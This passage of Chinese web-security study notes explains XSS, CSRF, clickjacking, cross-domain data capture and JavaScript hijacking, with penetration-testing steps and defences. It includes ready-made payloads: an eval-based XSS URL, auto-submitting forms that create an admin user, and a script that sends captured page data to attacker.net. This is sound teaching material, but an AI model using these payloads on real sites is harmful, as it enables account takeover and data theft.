here...&#x27;)或者为：http://sample.com/error.ashx?message=&lt;script&gt;eval(unescape(location))&lt;/script&gt;#%0Aalert(&#x27;long script insert here...&#x27;)location 代表的值先被 HTML 解码，然后传递给 eval 命令，整个 URL 作为有效的 javascript 执行；其中 http: 协议前缀作为代码标签，协议前缀后的 // 变成了单行注释的起始点，%0A 经过解码后，变成了换行符，表示注释结束，之后 alert 的代码被执行 实施有效的 XSS 攻击将攻击扩展到其他页面假如在某个页面发现了一个 XSS 漏洞，但该页面可能并不包含敏感数据，此时需要扩展该漏洞攻击范围。常见方法为利用该漏洞，先传送一个攻击脚本，该脚本用来实现在用户的浏览器中持续运行，监控并提取用户的数据；之后，当用户进入到包含敏感数据的页面时，就可以提取需要的数据了； 例如可以通过创建一个包含整个浏览器窗口的 iframe，然后在该 iframe 中重新加载当前页面；之后用户的浏览操作，实际都是在当前 iframe 中运行，并没有切换页面，从而使得攻击脚本延长了生命周期，得到始终运行； 修改请求方法很多应用程序经常同时接受 GET 和 POST 请求，但开发者并没有意识到这点，只将过滤规则适用在其中一个请求上，另外一种请求并没有使用过滤，因此，攻击者有机会利用另外一种请求要实现攻击； 通过 cookie 利用 XSS 漏洞 有些开发者利用 cookie 来保存用户相关的数据，从而实现定制化的效果，但这样其实很危险，因为这意味着攻击者可以提交设计好的字符串，然后让其出现在 cookie 中；之后应用程序的某个功能会去读取该 cookie 值，从而触发恶意脚本的执行； 另外有些应用程序可能还会允许在 URL 中设置与 cookie 同名的参数，然后会读取该参数值，导致漏洞； 一些浏览器使用的扩展技术（如 Flash）可能存在各种漏洞，但没有及时修复，通过利用这些插件本身的漏洞，就可能实现攻击； 在有漏洞的 A 页面设置一个永久性的 cookie 值，然后在 B 页面，当 cookie 被读取时，脚本得以执行； cookie 攻击可行的本质原因在于 cookie 是跨页面存在的，因此它可以用来在不同页面之间传递数据； 通过 Referer 消息头利用 XSS 漏洞攻击者自建一台服务器，放上目标应用程序的 URL，诱使用户点击；当用户点击后，发给目标程序请求消息头中的 Referer 字段，将自动设置为攻击者的服务器，此时攻击者有机会在该 Referer 字段中放入脚本，当目标程序读取它时，触发执行； 很多应用程序会尝试读取请求的 Referer 字段来实现一些功能，例如显示访问来源； 通过非标准请求和响应内容利用 XSS 漏洞有些应用程序在脚本中使用 XMLHttpRequest 来发送请求，而无须刷新页面；之后在收到服务端的响应内容后，通过 AJAX 提取内容，并改写 DOM 来实现页面局部内容的变化； 跨域请求：用户在 A 域名的页面下，发起访问 B 域名的请求；表单是允许的，但是 XHR 是不允许的，除非服务端实现接口；原理很简单：当浏览器发现用户发起向 B 网站的请求时，就向 A 域名的服务器发送一个确认，如果 A 服务器返回的响应中，在报头的 Access-Control-Allow-Origin 字段指示 B 域名是其允许的访问范围，那么浏览器就会向 B 域名发出请求；如果不允许，则浏览器拒绝请求，抛出一个错误； 通过在 HTTP 报头的 Content-Type 字段指定消息类型，浏览器支持直接处理响应内容，而无须由脚本进行处理；这种情况下，通常注入脚本代码的方式将失效，因为脚本没有机会操作响应内容； 虽然 XHR 不允许跨域请求，但传统的表单则支持向任意的域名发起请求，因此，可以使用表单来发送数据，从而避开 XHR 的限制； 将表单的 enctype 属性值设置为 text&#x2F;plain，可以实现在 HTTP 请求主体中跨域传送数据；其原理在于，当浏览器发现某个表单的 enctype 属性值为 text&#x2F;plain 时，它将按如下的方式处理该表单的数据： 在请求中隔行传送每个表单参数； 使用等号分隔每个参数的键名和键值； 不对参数名称和值进行 URL 编码； 注：不是所有的浏览器都遵守上面的做法，需要提前确认；已知浏览器：IE、Firefox、Opera 等； 这里最大的一个特性在于，浏览器会为键值地自动添加等号，因此攻击者可以利用这个特性来构建数据；假设需要提交的数据格式，本身包含有至少一个等号，那么我们可以将等号左边的数据做为键名，等号右边的数据做为键值，等号则由浏览器自动添加，三者合一，最终形成 XML 数据格式； 此处的要点在于利用表单的特性，来构建 XML 格式的请求主体； 123456// 传送跨域的 XML 请求// 将表单的 enctype 属性值设置为 text/plain，可以实现在 HTTP 请求主体中跨域传送数据&lt;form enctype=&quot;text/plain&quot; action=&quot;http://sample.com/vuln.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;&lt;?XML version&#x27; value=&#x27;&quot;1.0&quot;?&gt;&lt;data&lt;param&gt;foo&lt;/param&gt;&lt;/data&gt;&#x27;&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt; 如果在包含非标准内容的请求中发现了类似 XSS 漏洞的行为，则可以通过将消息头 Content-Type 属性的值设置为 text&#x2F;plain，然后查看应用程序是否依然能够正常响应；如果可以，说明存在 XSS 攻击漏洞；如果不行，则漏洞无法利用； 当响应由浏览器直接执行时，浏览器一般会跟消息头中的 Content-Type 规范，对响应内容进行处理；此时如果想要构建能够触发浏览器执的脚本的响应，一般来说需要利用内容类型的一些特点，例如 XML 支持在中间插入 HTML 内容（使用 XML 标签定义一个 XHTML 的命名空间）； 攻击浏览器 XSS 过滤器很多浏览器都内置了防范 XSS 攻击的功能，它们会监控请求和响应，检查其中的内容是否携带 XSS 攻击内容，如果有的话，会对其进行修改，以阻止攻击； 虽然浏览器的内置功能确实可以阻止绝大多数的标准 XSS 攻击，为攻击者带来很大的障碍，但有意思的是，过滤规则本身也会引入新的漏洞，给攻击者新的机会；一些常见的避开办法如下： 过滤器经常只检查参数值，只没有检查参数名称；这意味着如果参数名称会回显的话，那么攻击者就可以将脚本注入到参数名称中，避开过滤； 过滤器单独检查每个参数值，但是攻击者可以将攻击脚本分散在多个参数中；当这些参数同时回显时，就能够组合成完整的攻击脚本； 出于性能考虑，过滤器仅检查跨域请求，没有检查由用户点击 URL 发出的本地请求，攻击者可以在内容中放入恶意链接，等待用户点击； 利用浏览器本身的非正常行为： 当存在多个同名参数时，IE 会将它们串联起来，因此攻击者可以将攻击荷载分散在多个参数中，从而避开 IE 针对单个参数的过滤；但最终串联起来后又能实现预期效果； 过滤器通常基于对输入和输出进行匹配检查，确定二者存在关联；因此攻击者可以故意在输入中放入应用程序的现有脚本，从而利用过滤器将现有脚本进行净化，让其失去作用，例如破坏应用程序在客户端的案例防御功能； 查找并利用保存型 XSS 漏洞保存型漏洞的探查大体上和反射型类似，但二者还是有如下一些重要的区别 渗透测试步骤 反射型漏洞能够直接从应用程序的响应内容中发现，保存型则要曲折一点；当在某个位置提交一个预设输入值的请求后，需要在整个程序的范围去查找该输入会出现在什么地方，因为它不一定直接出现在该请求的响应内容中；同一个输入值有可能出现在很多个不同的页面，并且每个页面可能使用了不同的过滤保护方法，因此需要对每个出现的位置进行单独的分析； 重点检查管理员可以访问的所有应用程序区域，并确认其中是否存在某些内容可以由非管理员用户提交；例如很多应用程序会提供日志浏览功能，这种功能很容易存在漏洞，攻击者可以通过提交包含恶意 HTML 的日志记录，等待管理员浏览时触发； 某些应用程序的功能是由多个步骤组成的，因此单个步骤中提交的数据要最终成功保存并生效，需要彻底完全所有步骤，再判断漏洞是否存在，仅单个步骤不准确； 跟探查反射型漏洞时一样，在提交输入时，除了尝试每一个参数外，还应该包括每一个消息头；同时，在探查保存型漏洞时，还应注意应用程序是否接收一些带外通道数据的功能，这些功能很很可能也是攻击切入点； 如果应用程序允许上传和下载文件，则应探查该功能是否存在保存型漏洞； 发挥想象力，找到各种可能提交输入，并出现在其他用户界面的办法；例如某些应用程序的搜索功能会显示搜索频率最高的关键字，攻击者通过多次提交相同的搜索关键字，即可以引入攻击荷载； 在探查完位置后，接下来要考虑两个事情： 如果设计荷载，让其出现在目标用户的界面上，实现预期目的； 如果避开过滤 在提交输入请求时，如果存在多个参数，则应该为每个参数设计不同的值，这样才好判断具体是哪个参数，最终出现在哪个位置；如果所有参数值都相同，则很难判断，全部混在一起了； 在 Web 邮件应用程序中测试 XSSWeb 邮件应用程序由于需要接收第三方的内容，并展示在界面上以供用户查看，因此其天然存在保存型 XSS 漏洞的风险；最便捷的探查办法是创建一个自己的账户，然后自己给自己发送大量设计过攻击邮件，看攻击是否能够成功； 如果使用标准的邮件客户端，由于其自带内容净化功能，很可能导致无法将原始内容一字不变的发送出去，此时需要使用一些特殊的邮件发送工具来发送，例如 UNIX sendmail 命令； 12// 命令sendmail -t test@example.org &lt; email.txt 在 email.txt 文件中指定邮件内容 可根据需要使用不同的 content-type 和 charset，以避开目标服务器的过滤机制； 在上传文件中测试 XSS文件上传功能很常见，尤其是图片，常用于 UGC 内容和用户的头像中；该功能是否易于受到攻击，跟几个方面的因素有关： 上传时，是否有扩展名的限制； 上传时，是否有检查文件内容，以确认格式正确； 下载时，是否通过 content-type 消息头指定内容类型，例如 image&#x2F;jpeg； 下载时，是否通过 Disposition 消息头，指示浏览器直接保存文件到磁盘上，而非打开它； 测试方法：上传一个包含简单的概念验证脚本的文件，然后下载它，看是否会原样返回并执行脚本；如果会的话，则说明漏洞存在； 如果有扩展名限制，则尝试更换其他各种不同的扩展名，因此虽然扩展名与内容可能不同，但如果内容中包含 HTML，它仍然有可能被浏览器执行； 如果应用程序对文件内容进行检查，则可通过混合文件格式来避开，即在一个文件中包含部分指定类型的内容（如图片）；由于浏览器支持越来越多的可执行代码格式，因此混合文件内容的攻击原理仍然适用； 在通过 Ajax 上传的文件中测试 XSS URL 的片断标识符 # 用来对当前 URI 资源的某个局部进行标识，它常用的一个场景是可以记住某个位置，这样当用户在进入这个界面时，通过脚本，可以让页面滚动到指定的局部位置，而无须从头开始浏览； 由于片断标识符中的内容会被脚本加载，因为它可能存在 XSS 漏洞；攻击者通过在标识符内容中混入某个恶意文件，诱使用户点击，触发恶意文件的加载并执行；例如： 攻击者甚至可以在标识符内容中放入一个外部服务器的脚本，当用户点击链接时，会向某个攻击者控制的外部服务器发送请求，下载攻击者提前写好的恶意脚本文件； 查找并利用基于 DOM 的 XSS 漏洞 DOM 类型的漏洞与反射型漏洞的区别在于前者没有提供 HTML，而是通过将恶意代码混入请求参数来实现攻击； 常规探查办法：手动浏览应用程序的每个功能，并修改每一个参数，插入一个特殊的测试字符串，然后观察应用程序服务器返回的响应中，是否包含该字符串； 由于不知道应用程序的客户端脚本将如何处理参数和插入方式，使用常规的探查办法可能非常低效，更好的办法是主动阅读目标程序的客户端 JS 代码，了解其处理参数的逻辑，然后有针对性的对输入参数进行设计；已有不少现成的工具可以完成这一个过程，例如 DOMTracer； 渗透测试步骤： 在解析应用程序的过程中，检查客户端脚本是否调用 DOM API，如果有的话，再查看页面上是否参数被提交到页面中；常见的 API 如下： document.location document.URL document.URLUnencoded document.referer windown.location 检查 DOM API 的调用代码，了解其处理用户数据的方法，看是否可以使用针对性的输入来执行任意的 js ； 特别注意数据被传送到 document 的以下方法： document.write() document.writeln() document.body.innerHtml() eval() window.execScript() window.setInterval() window.setTimeout() 查看客户端的脚本中是否有过滤的代码，如果有的话，了解其过滤机制，以设计避开的办法； 有时候，服务端本身也对输入进行过滤，以避免 DOM 攻击；此时，需要使用前面提到的各种方法，探查服务器的机制； 有些客户端脚本不是将参数解析成键值对，而是直接提取等号位置后面的内容，此时会有两个漏洞： 服务端很可能只会过滤已知属性，而不会过滤未知属性；因此，攻击者可以插入一个虚拟的参数键值对，避开服务端的过滤；同时利用客户端只提取等号右边内容的特点，让插入值被加载； 由于浏览器不会将片断符的内容提交给服务端，因此攻击可以将恶意内容插入在片断标识符之后；这样可避开服务端的检查，同时内容仍可被客户端加载； 如果客户端脚本对基于 DOM 的数据进行非常复杂的处理，通过静态代码分析很难了解其完整处理过程的话，可以尝试利用 js 调试器来动态监控脚本的执行情况，因为调试器可以很方便的设置断点，监视感兴趣的代码与数据； 防止 XSS 攻击防止反射型与保存型 XSS 漏洞反射型与保存型 XSS 漏洞的根本原因在于未对用户的输入进行严格的过滤和净化； 三重防御法 确认输入 数据长度限制 仅包含合法字符的白名单； 与一个特殊的正则表达式匹配； 对不同的字段应用不同的确认规则 确认输出如果用户提交的输入需要被复制到响应中的话，那些应该对这些内容进行严格的净化 对数据进行 HTML 编码，无谓数据出现在什么地方，无论什么字符； 避免在敏感位置插入用户可以控制的数据；如果一定需要，则应根据用户的输入的类型，插入由开发者提前设计好的内容，而不是复制并插入用户提交的内容； 对用户输入中出现的敏感字符进行转义； 输入和输出过滤结合可以带来双重保障，降低被攻击的风险，其中输出过滤必不可少；虽然这会带来一定的性能损失； 消除危险的插入点 避免在现有的 JS 代码中插入用户可控制的数据，包括 标签和事件处理器 避免在接受 URL 作为标签属性值嵌入用户输入； 在消息头中强制使用指定的编码类型，避免由请求参数或者用户输入进行指定； 允许有限的 HTML尽量避免接受由用户直接提交包含 HTML 的内容，如果实在必须支持，则应该严格控制用户可用的 HTML 标签子集，避免提供任何引入脚本的方法，例如使用白名单，仅允许特定的标签和属性；即使这样也仍然有风险，因为攻击者可以普通的常用属性中插入脚本；一般来说，较好的办法是找到某个成熟的框架，例如 AntiSamy ，用来过滤用户提交的输入； 另外一种办法是开发某种定制的中间语言，允许用户在输入中使用有限的中间语言，然后再由应用程序进行翻译； 防止基于 DOM 的 XSS 漏洞确认输入在客户端的脚本中，对用户输入进行过滤；同时在服务端对 URL 数据进行严格的确认，以检测出包含攻击脚本和恶意请求，过滤的方法包括： 查询字符串中只有一个参数； 参数名为 message，大小写敏感； 参数值仅包含字母或数字内容； 确认输出将用户可控制的 DOM 数据插入到文档中之前，应用程序应对其进行 HTML 编码，以便将一些危险的字符安全的显示在页面中，示例如下： 12345function sanitize (str) &#123; const d = document.createElement(&#x27;div&#x27;); d.appendChild(document.createTextNode(str)); return d.innerHTML;&#125; 13. 攻击其他用户：其他技巧诱使用户执行操作请求伪造 攻击者在无需知道受害者的 cookie 是什么，而是直接由浏览器添加该 cookie，在受害者客户端发起伪造的请求； 本站点请求伪造 OSRF：on site request forgery 利用输入可以出现在页面中的特点（即保存型 XSS 漏洞），在页面中插入一个伪造的请求，当用户（尤其是管理员用户）点击该设计好的 URL 链接时，发起一个请求（例如创建一名管理员用户），达到攻击目的 12345678910111213&lt;!--请求参数--&gt;type=question&amp;name=daf&amp;message=foo&lt;!--页面结构--&gt;&lt;tr&gt; &lt;td&gt;&lt;img src=&quot;/images/question.gif&quot;&gt;&lt;/td&gt; &lt;td&gt;daf&lt;/td&gt; &lt;td&gt;foo&lt;/td&gt;&lt;/tr&gt;&lt;!--开发者可能对 name 和 message 参数进行了过滤，但攻击可以针对 img 标签的 src 标签属性设计插入&quot;/admin/newUser.php?username=daf2&amp;password=0wned&amp;role=admin#&quot;，最后的 # 符号将终止原本的 .gif 后缀--&gt; 案例1：eBay 网站 攻击者创建一个拍卖品，吸引用户去点击查看它；攻击者在创建卖品时，会上传一个指向站外服务器的卖品图片链接；创建时，该链接是有效的，指向的内容确实是一张图片，从而可以通过 eBay 的检查机制； 卖品创建完成后，攻击品替换了链接中的内容，变成了一段脚本； 当受害者点击该链接时，会将恶意脚本下载到本地并执行； 该恶意脚本会代表受害者发起一个链接，对 eBay 上面另外一个卖品发起任意的报价； 渗透测试步骤 如果一个用户输入的数据，会显示在另外一名用户的界面上，则它除了可能存在保存型 XSS 漏洞外，还有可能存在 OSRF 型漏洞； 用户提交的数据被插入到某个 URL 或者路径中的时候，很有可能存在 OSRF 漏洞（除非应用程序设置字符白名单进行过滤） 如果发现 OSRF 漏洞， 则应该有针对性的设计 URL 请求作为攻击目标； 跨站点请求伪造 CSRF: cross site request forgery 攻击原理和示例攻击者通过创建一个看似无害的网站，然后放置一个指向目标网站的链接，诱使用户点击该链接，向目标网站发起请求，执行攻击者想要实现的恶意操作； 同源策略并不会阻止 A 网站向 B 网站发起请求，但是它会阻止 A 网站的脚本处理 B 网站的响应；因此，CSRF 是一种单向的攻击； 假设某个网站允许管理员用户发起一个请求来创建一名新用户，创建其设置的请求格式如下： 1234567POST /auto/390/NewUserStep2.ashx HTTP/1.1Host: mdsec.netCookie: SessionId=12346Content-Type: application/x-www-form-urleencodedContent-Length: 83realname=daf&amp;username=daf&amp;userrole=admin&amp;password=letmein1&amp;confirmpassword=letmein1 该请求由于以下三个方面的原因，导致其容易受到 CSRF 攻击 该请求可以执行特权操作； 该请求仅依靠 cookie 来追踪会话，没有其他令牌或者无法预测的值； 除 cookie 外，请求中的所有其他参数值都是可以预测的； 攻击者可以通过构建如下表单，诱使用户点击提交请求，达到攻击目的 123456789101112&lt;html&gt; &lt;body&gt; &lt;form action=&quot;https//mdsec.net/auth/390/NewUserStep2.ashx&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; value=&quot;daf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;usernmae&quot; value=&quot;daf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;userrole&quot; value=&quot;admin&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;letmein1&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;confirmpassword&quot; value=&quot;letmein1&quot;&gt; &lt;/form&gt; &lt;script&gt;document.forms[0].submit();&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 浏览器在发起跨域请求时，会自动带上目标网站的 cookie，导致攻击得以实现； 利用 CSRF 漏洞CSRF 漏洞常常出现在应用程序仅依赖 cookie 进行会话管理的场景； 渗透测试步骤 解析应用程序的功能； 找到某项仅依赖 cookie 来追踪用户会话的敏感功能，确认功能的请求参数可以提前确认，不包含无法预测的数据； 创建一个无需交互操作即可发起请求的 HTML 页面（GET 请求可使用 img 标签；POST 请求则使用隐藏表单）； 登录应用程序后，使用同一个浏览器加载该 HTML 页面，确认应用程序的反应，看它是否执行所需要的操作； 假设应用程序的某个管理功能，接受某个用户标识符的参数（如用户id），然后会查询数据库，返回与该用户相关的信息，并显示在界面上；由于该功能仅管理员可用，而管理员本来就具有查看权限，因此开发者通常情况下不会对该功能做 CSRF 防御； 假设该功能的某个参数中，存在 SQL 注入漏洞，那么攻击者就会很有兴趣诱使非管理员用户去点击某个 CSRF 链接，发起请求，利用 SQL 注入漏洞，实现想要的查询； CSRF 与登录案例2：家庭路由器 路由器通常有一个管理界面，上面有一些敏感操作，例如开放端口供外部访问；很多用户在购买路由器后，并不会修改上面的默认密码，而有不少设备厂家对设备使用通用密码，这使得攻击者可以提前知道默认密码是什么；如果用户之前登录过该路由器，攻击者可以设计一个看似无害的恶意 URL，诱使用户点击，之后向本地的路由器发起一个请求；该请求将携带之前用户登录时获得的令牌，从而路由器将接受攻击者的请求和参数，并进行处理； 案例3：文件上传与下载 某个应用程序提供文件上传和下载功能，由于文件是私有的，只能由上传者本人下载，因此开发者可能误以为该功能没有攻击的价值，从而没有设置足够的防御措施；攻击者可以设计第一个 URL，诱使用户点击，然后以攻击者提前注册好的账号密码登录目标网站；攻击者再设计第二个 URL，诱使用户点击，此时用户将以攻击者的身份，从而该网站上下载攻击者放置的恶意脚本文件，并执行它，实现攻击者的目标意图；(诱使受害者以攻击者的身份，下载攻击者上传的恶意文件) 防止 CSRF 漏洞防止 CSRF 漏洞的一个办法是避免仅依赖 cookie 来追踪用户的会话，而应该增加一个隐藏表单字段，存放一个无法预测的随机值；当用户发起请求时，需要一起发送该字段值；服务器结合 cookie 和该字段值来确认用户的身份； 某些应用程序将反 CSRF 令牌设置得过短，因为猜想攻击者如果使用蛮力攻击，短时间内提交过多无效令牌请求，那么请求程序将终止攻击者的会话，从而终止攻击。 以上思路虽然没错，但攻击者可以避开该方法，枚举所有可能的令牌值，然后分散放到不同用户的页面上，当某个链接被点击后，监控其服务端的响应，如果响应正常，则说明该令牌有效；之后攻击者就可以使用该令牌伪造用户身份发起请求； 由于 CSRF 是单向攻击，有些开发者使用多阶段操作，来规避漏洞，其思路是即使攻击者伪造了第一阶段的请求，由于用户会收到响应，并在第二阶段确认操作是否无误，这时候就会发现异常，那么理论上就可以避免攻击者在第一阶段发起的操作直接生效；实际上攻击者经常直接第二个请求，完全不管第一个；或者当用户点击恶意链接后，攻击者按先后顺序同时发出两个请求即可； 通过 XSS 突破 CSRF 防御如果某个应用程序存在 XSS 漏洞，那么极大概率 CSRF 的防御机制将失效，因为攻击者通过 XSS 漏洞可以读取到任何需要的令牌值； 除了反射型 XSS 漏洞外，因为利用该漏洞，首先需要发起一个请求，之后才能在响应中插入恶意代码；但如果此时有 CSRF 防御，那么意味着需要一个令牌才能让请求成功，于是这就变成了一个先有鸡还是先有蛋的问题； 如果应用程序存在任何保存型的 XSS 漏洞，那么攻击者可以利用这些漏洞直接突破 XSRF 防御； 由于 CSRF 防御令牌通常在整个会话期间都是一致的，这意味着如果有任何一个页面存在反射型 XSS 漏洞，同时缺少 CSRF 防御，那么攻击者就可以利用该漏洞取得令牌，让 CSRF 防御失效； 如果令牌与用户账号关联，而不是与会话关联，那么攻击者可以伪造表单，让受害者以自己的账号登录应用程序，下载恶意代码；然后假装意外退出账号，诱使受害者使用其自己的账号登录；由于恶意代码已经在本地运行，受害者在登录过程中和登录后都将受到攻击者的控制； 如果令牌与会话关联，但同时应用程序的 cookie 存在注入漏洞，那么攻击者将直接用自己的 cookie 和令牌替换受害者的 cookie 和令牌，下载恶意代码，之后的操作与上一步相同； CSRF 防御可以在一定程度上保护 XSS 漏洞，但作用只有一点点，安全的做法还是应该修复所有的 XSS 漏洞； UI 伪装UI 伪装的原理很简单，即攻击者的页面会使用 iframe 元素，将目标页面的内容加载到其中，这样该页面看起来像真的一样，以便能够诱使用户进行点击；但实际上，攻击者在该 iframe 元素上覆盖了一层透明层，用户看不见；当用户进行操作时，会误以为是在与目标程序进行交互，但实际是与攻击者设计的透明元素进行交互；虽然由于同源策略，攻击者无法读取令牌，但是透明元素向目标程序发起的请求，将自动携带有令牌，从而导致攻击者可以诱使用户做出一些该用户并不知情的操作； 攻击者还可以在其页面中设计各种诱使用户的操作，当用户进行操作时，攻击者使用脚本代码将这些操作传递到目标程序的页面，从而以用户的名义，向目标程序页面发送这些操作，并在用户不知情的情况下，最终向目标程序发起这些操作； 破坏 iframe 防御为了防止 UI 伪装攻击，开发者在自己的页面加载后，会运行一段代码，检查自己的页面是否被浏览器加载到了一个 iframe 中，如果是的话，就终止服务，重定向的报错页面； 123456&lt;!-- 检测并逃离 iframe 示例--&gt;&lt;script&gt; if (top.location != self.location) &#123; top.location = self.location; &#125;&lt;/script&gt; 攻击者有多种方法可以避开上面这种简单的防御办法，包括如下： 虽然攻击者的页面在顶层，控制着整个页面，因为攻击者可以有改变页面上一个变量的含义；当子 iframe 页面中的代码尝试访问这些变量时，会得不到预期的结果，例如: var location = 'foo'； 攻击者可以监听页面的 window.onBeforeUnload 事件，当页面加载后，就对目标程序的防御代码进行搜索和禁用；例如定义 sandbox 属性，从而禁用 iframe 页面中的脚本，同时保持 cookie 有效； 防止 UI 伪装通过使用 X-Frame-Options 消息头，可以指示浏览器不将当前页面加载到 irame 中，从而实现对 UI 伪装的防御；该属性支持两个值，其意义分别如下： deny：拒绝所将页面插入 iframe 的尝试； sameorigin：仅当前域名可插入，任何第三方域名都不用插入； 在测试是否存在 UI 伪装漏洞时，要同时检查一下移动设备的版本；因为移动设备上的表现经常跟 PC 端有所不同； 跨域捕获数据虽然同源策略可以限制 A 域的代码访问 B 域数据；但是仍然存在一些办法，可以实现这种访问； 通过注入 HTML 捕获数据攻击者可以利用应用程序提供的功能，在其他用户收到的响应中注入一段有限的 HTML；在这种情况下，就可以利用 HTML 注入条件，向攻击者所在的域发送页面中的敏感数据（因为此时是在受害者打开的页面中，受害者发起的请求，是在应用程序的域中，因此不受到同源策略的影响）； 12345678910&lt;!--假设应用程序通过设置隐藏表单进行 CSRF 防御，那么页面上一般会有如下的隐藏表单，用来发送令牌--&gt;&lt;form action=&quot;http://app.com/forward_email&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;nonce&quot; value=&quot;2230313740821&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Forward&quot;&gt; ...&lt;/form&gt;&lt;script&gt; var _StatsTRackerId=&#x27;AAE78RF27CB3210D&#x27;; ...&lt;/script&gt; 攻击者可以在该隐藏表单之前，找到一个插入点，注入以下文本： 由于该文本也是一段 HTML 标签，但没有结束，那么在注入后，浏览器将在等号之后的文本中，寻找下一个单引号，以便进行配对；从而使得攻击者有机会将等号之后的内容，下一个单引号之前的内容，纳为其可注入的链接的参数的一部分； 当受害者点击该图片链接时向攻击的域发起请求时，受害者页面上的隐藏表单内容，将作为请求参数的组成部分，发送给攻击者的域，从而使得攻击者捕获了隐藏表单中的令牌； 另外一种攻击方法是在隐藏表单之前，注入以下的文本： 由于该段文本是一段 HTML 标签的前半部分，但不包含结束标签；那么浏览器会一直往后寻找，直到找到配对的标签为止；那么原页面上的 form 起始标签将被忽略（相当于注释掉了），但表单中的内容仍然有效。此时隐藏表单相当于被修改了，原本表单是要向应用程序的域发起的请求，现在变成了向攻击者的域发起请求； 第二种攻击方法注入的是合法且有效的 HTML 子集，因此很可能会避开潜在的输入确认机制； 通过注入 CSS 捕获数据注入 HTML 的缺点在于注入内容中需要使用尖括号，因此会被常见的过滤机制删除或者进行 HTML 编码，从而使得注入失效；因此，攻击者会转而采用注入 CSS 内容，来达到攻击目的； 攻击者在邮件的主题行中，设置如下内容的标题 该内容在邮件中注入后变成如下： 12345678910111213141516171819&lt;html&gt; &lt;head&gt; &lt;title&gt;Wao Inbox&lt;/title&gt; &lt;/head&gt; &lt;body&gt; ... &lt;td&gt;&#123;&#125; *&#123;font-family: &#x27;&lt;/td&gt; ... &lt;form action=&quot;http://app.com/forward_email&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;nonce&quot; value=&quot;2230313740821&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Forward&quot;&gt; ... &lt;/form&gt; &lt;script&gt; var _StatsTRackerId=&#x27;AAE78RF27CB3210D&#x27;; ... &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 由于注入的内容为 CSS，并且单引号未结束，浏览器将继续往下寻找单引号进行配对（直到 script 的变量定义部分找到）；两个单引号之间的内容变成了 font-family 的属性值； 理论上 CSS 的属性值可以不需要使用单引号括起来，但为了避免在敏感数据之前出现分号，导致 CSS 属性值的长度被提前终止，未包含敏感数据，故在此处使用单引号，以便其和 script 中的引号进行配对，确认两个引号之间的内容包含了敏感数据； 在完成了以上注入动作后，敏感数据已经包含在 font-family 属性；接下来攻击者再在邮件内容中插入一段脚本（此段内容属于攻击者的域），去读取 font-family 属性值，放在某个图片的 src 属性中；当用户点击该图片时，将触发图片上的 src 请求，发送敏感数据到攻击者的服务器； 12345&lt;link rel=&quot;stylesheet&quot; href=&quot;https://wao-mail.com/inbox&quot; type=&quot;text/css&quot;&gt;&lt;script&gt; document.write(&#x27;&lt;img src=&quot;http://attacker.net/capture?&#x27; + escape(document.body.currentStyle.fontFamily) + &#x27;&quot;&gt;&#x27;);&lt;/script&gt; Javascript 劫持背景：虽然同源策略阻止 A 域的脚本读取 B 域的响应敏据，但是并没有限制 A 域可以包含来自 B 域的脚本代码，同时这些脚本代码允许在 A 域中执行；一种常见的使用场景是 A 引用 B 的静态脚本，例如 JQuery； 由于静态脚本代码本来是公开的，其中并不包含敏感数据，所以一般这种做法并不会带来危险；但是今天很多应用程序使用脚本代码来传输敏感数据，有些应用程序甚至还允许动态插入脚本，因此，攻击者从中可以找到一些漏洞机会； 函数回调假设某个应用程序在页面上引用某个脚本文件，来处理某个用户点击事件；当点击事件发生时，会执行该脚本文件中的代码，向服务端发起用户信息请求，并在收到响应后，调用脚本中的 showUserInfo 回调函数来处理响应中的用户敏感数据； 针对以上情形，攻击者可以设计一个网页，在其中隐蔽放上一个诱使用户进行点击的链接，同时引用目标程序的脚本，但自定义一个自己的 showUserInfo 函数；当点击发生时，引用的脚本会向目标程序请求用户数据；如果在点击之前，用户恰好已对登录过目标程序，则该请求将是有效的；得到响应后，由于回调函数已经被攻击者定义的函数覆盖，响应将由攻击者定义的脚本进行处理，从而捕获用户的敏感数据； 有个困惑：攻击者引用目标程序脚本并覆盖回调函数，该脚本向目标网站 B 域发起请求，那么返回的响应是否能够被攻击者设计的网页 A 域进行处理？ 1234&lt;script&gt; function showUserInfo (x) &#123; alert(x); &#125;&lt;/script&gt;&lt;script src=&quot;https://target_app.net/source.ashx&quot;&gt;&lt;/script&gt; JSON应用程序经常使用 JSON 作为数据的传输格式，JSON 本质上是一堆字符串，因此浏览器在接收到该字符串后，需要对其进行解析；攻击者可以在自定义页面中，对 Javascript 内置数据类型的构造函数进行修改，从而改变解析 JSON 的结果 12345678910&lt;!--攻击者在自定义页面中重置 Array 构造函数--&gt;&lt;script&gt; function capture(s) &#123; alert(s); &#125; function Array() &#123; for (var i = 0; i &lt; 5; i++) &#123; this[i] setter = capture; &#125; &#125;&lt;/script&gt;&lt;script src=&quot;https://target_app.net/source.ashx&quot;&gt;&lt;/script&gt; 变量为了提高用户体验，很多开发者会使用 AJAX 向服务端请求数据，并在前端使用脚本处理响应，更新局部网页；假设应用程序在响应中的某个变量放置了临时令牌，用来反 CSRF；那么攻击者可以自定义网页中先引用应用程序的公开脚本，然后再定义自己的脚本去读取该变量，捕获敏感数据； 12345678&lt;!--假设应用程序的脚本中，定义了如下变量用于保存临时令牌--&gt;...nonce = &#x27;adfa313EFAa00eEF#2j&#x27;;...&lt;!--攻击者可以在引用应用程序的脚本后，再自定义函数捕获该变量--&gt;&lt;script src=&quot;https://target_app.com/status&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(nonce)&lt;/script&gt; 变量可能在脚本中的不同位置进行定义，存在作用域的问题；因此攻击者需要了解应用程序脚本内部的逻辑，并进行模仿，以便能准确捕获； E4XE4X 是指 ECMAScript 进行扩展，增加了对 XML 的支持，但这种支持也引入了新的漏洞；例如 E4X 允许在 